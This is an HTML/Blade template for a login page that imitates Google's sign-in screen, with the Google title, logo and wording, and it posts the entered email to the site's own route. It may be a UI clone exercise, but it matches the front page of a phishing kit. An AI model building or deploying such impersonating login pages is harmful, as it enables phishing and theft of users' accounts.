<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sign in - Google</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="login.css">
</head>
<body>
    <div class="login-container">
        <div class="left-section">
            <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_google_lockup_default_1x_r2.png" alt="Google Logo">
        </div>
        <div class="right-section">
            <h1>Sign in</h1>
            <p class="subtitle">Use your Google Account</p>
            <form method="POST" action="{{ route('login.submit') }}">
                @csrf
                <div class="input-group">
                    <input type="text" name="email" placeholder="Email or phone" required>
                </div>
                <div class="forgot-link">
                    <a href="#">Forgot email?</a>
                </div>
                <div class="info-text">
                    Not your computer? Use Guest mode to sign in privately.<br>
                    <a href="#">Learn more about using Guest mode</a>
                </div>
                <div class="submit-group">
                    <a href="#">Create account</a>
                    <button type="submit" class="btn">Next</button>
                </div>
            </form>
        </div>
    </div>
    <footer>
        English (United States) • <a href="#">Help</a> <a href="#">Privacy</a> <a href="#">Terms</a>
    </footer>
</body>
</html>
